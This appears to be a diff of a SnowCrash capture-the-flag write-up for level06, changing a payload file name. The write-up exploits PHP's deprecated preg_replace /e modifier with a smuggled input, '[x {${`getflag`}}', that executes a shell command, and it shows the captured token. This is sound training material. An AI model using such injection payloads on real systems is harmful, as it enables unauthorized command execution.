@@ -25,11 +25,11 @@ $r = x($argv[1], $argv[2]); print $r;
 We can see in the 3rd call to `preg_replace`  the deprecated flag `/e`.
 
 Let's start by creating our file:
-``echo '[x {${`getflag`}}' > /tmp/getflag``
+``echo '[x {${`getflag`}}' > /tmp/chopperledrapeau``
 
-Now we just need to run `./level06` with `/tmp/exploit` as an argument:
+Now we just need to run `./level06` with `/tmp/chopperledrapeau` as an argument:
 ```
-level06@SnowCrash:~$ ./level06 /tmp/getflag
+level06@SnowCrash:~$ ./level06 /tmp/chopperledrapeau
 PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
  in /home/user/level06/level06.php(4) : regexp code on line 1
 ```
